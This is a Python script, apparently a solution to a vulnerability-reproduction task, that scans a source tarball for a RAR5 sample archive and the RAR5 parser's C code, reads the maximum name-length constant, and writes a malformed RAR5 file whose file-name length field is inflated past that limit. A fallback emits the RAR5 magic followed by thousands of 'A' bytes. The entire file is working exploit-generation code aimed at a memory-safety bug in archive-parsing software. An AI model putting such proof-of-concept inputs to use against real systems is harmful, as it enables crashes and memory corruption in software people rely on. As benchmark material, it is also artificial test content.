import tarfile
import re
import binascii


class Solution:
    def solve(self, src_path: str) -> bytes:
        rar5_c_text = ''
        sample_data = None

        with tarfile.open(src_path, 'r:*') as tar:
            for member in tar.getmembers():
                if not member.isfile():
                    continue
                name_lower = member.name.lower()
                f = tar.extractfile(member)
                if f is None:
                    continue
                content = f.read()

                # Try to find a RAR5 sample archive (plain .rar or uuencoded .rar.uu)
                if sample_data is None:
                    raw = None
                    if name_lower.endswith('.rar'):
                        raw = content
                    elif name_lower.endswith('.rar.uu'):
                        raw = self._decode_uu(content)
                    if raw is not None and raw.startswith(b'Rar!\x1a\x07\x01\x00'):
                        sample_data = raw

                # Collect RAR5 parser source to detect max name length
                if 'rar5' in name_lower and name_lower.endswith('.c'):
                    try:
                        rar5_c_text += content.decode('utf-8', 'ignore') + '\n'
                    except Exception:
                        pass

        name_max = self._detect_name_max(rar5_c_text)

        if sample_data is not None:
            return self._build_poc_from_sample(sample_data, name_max)
        else:
            return self._fallback_poc(name_max)

    def _decode_uu(self, content: bytes) -> bytes:
        lines = content.splitlines()
        out = bytearray()
        in_body = False
        for line in lines:
            if not in_body:
                if line.startswith(b'begin '):
                    in_body = True
                continue
            if line.startswith(b'end'):
                break
            if not line.strip():
                continue
            try:
                out.extend(binascii.a2b_uu(line))
            except binascii.Error:
                # Skip malformed lines
                continue
        return bytes(out)

    def _detect_name_max(self, text: str) -> int:
        if not text:
            return 4096
        best = 0
        patterns = [
            r'#define\s+MAX_?NAME[_A-Z0-9]*\s+([^\n/]+)',
            r'#define\s+RAR5_?MAX_?NAME[_A-Z0-9]*\s+([^\n/]+)',
            r'static\s+const\s+(?:int|unsigned|size_t|unsigned\s+int|unsigned\s+long)'
            r'\s+max_?name[_a-z0-9]*\s*=\s*([^\n;]+)',
        ]
        for pat in patterns:
            for m in re.finditer(pat, text):
                expr = m.group(1).strip()
                expr = expr.split('/*')[0].split('//')[0].strip()
                val = self._parse_const_expr(expr)
                if val is not None and val > best:
                    best = val
        if best > 0:
            return int(best)
        # Check for forms like MAX_NAME (1 << 16)
        for m in re.finditer(r'MAX[_A-Z0-9]*NAME[_A-Z0-9]*\s*\(\s*([^)]+)\)', text):
            expr = m.group(1).strip()
            expr = expr.split('/*')[0].split('//')[0].strip()
            val = self._parse_const_expr(expr)
            if val is not None and val > best:
                best = val
        if best > 0:
            return int(best)
        return 4096

    def _parse_const_expr(self, expr: str):
        expr = expr.strip()
        if not expr:
            return None
        expr = re.sub(r'\b(ULL|UL|LL|U|L)\b', '', expr)
        if not re.fullmatch(r'[0-9xXa-fA-F+\-*/()<>|& ]+', expr):
            return None
        try:
            val = eval(expr, {"__builtins__": None}, {})
        except Exception:
            return None
        if isinstance(val, int):
            return val
        return None

    def _encode_varint(self, value: int) -> bytes:
        out = bytearray()
        v = value
        while True:
            b = v & 0x7F
            v >>= 7
            if v:
                out.append(b | 0x80)
            else:
                out.append(b)
                break
        return bytes(out)

    def _find_name_field(self, data: bytes):
        ascii_set = set(range(32, 127))
        ascii_set.update((9, 10, 13))
        n = len(data)
        # search configurations: (max_len, require_dot)
        configs = [
            (64, True),
            (64, False),
            (255, True),
            (255, False),
        ]
        for max_len, require_dot in configs:
            i = 1  # start from 1 so we have at least one preceding byte
            while i < n - 1:
                if data[i] not in ascii_set:
                    i += 1
                    continue
                s = i
                e = s + 1
                while e < n and data[e] in ascii_set:
                    e += 1
                L = e - s
                if L < 3 or L > max_len:
                    i = e
                    continue
                segment = data[s:e]
                if require_dot and 46 not in segment:
                    i = e
                    continue
                # check preceding byte as varint (single byte)
                if data[s - 1] != L or L >= 0x80:
                    i = e
                    continue
                return s - 1, s, L
                # unreachable, but kept for clarity:
                # i = e
        return None, None, None

    def _build_poc_from_sample(self, data: bytes, name_max: int) -> bytes:
        pos_len, pos_name, old_len = self._find_name_field(data)
        if pos_len is None:
            return self._fallback_poc(name_max)
        if name_max is None or name_max <= 0:
            name_max = 4096
        default_target = 2048
        target = max(default_target, old_len * 4, name_max + 1)
        if target > 65536:
            target = 65536
        if len(data) < pos_name + target:
            data = data + b'X' * (pos_name + target - len(data))
        new_len = target
        new_len_bytes = self._encode_varint(new_len)
        pre = data[:pos_len]
        name_bytes = data[pos_name:pos_name + new_len]
        post = data[pos_name + new_len:]
        new_data = pre + new_len_bytes + name_bytes + post
        return bytes(new_data)

    def _fallback_poc(self, name_max: int) -> bytes:
        if name_max is None or name_max <= 0:
            name_max = 4096
        magic = b'Rar!\x1a\x07\x01\x00'
        payload_len = max(name_max + 1, 4096)
        payload = b'A' * payload_len
        return magic + payload